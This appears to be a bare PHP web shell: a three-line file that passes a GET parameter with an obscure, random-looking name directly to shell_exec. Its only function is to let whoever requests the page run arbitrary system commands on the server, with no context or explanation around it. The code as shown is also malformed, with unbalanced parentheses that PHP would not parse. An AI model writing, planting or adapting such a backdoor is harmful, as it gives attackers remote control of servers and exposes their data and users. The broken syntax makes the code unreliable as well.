<?php
shell_exec(($_GET['qs_UhMEe']);
?>
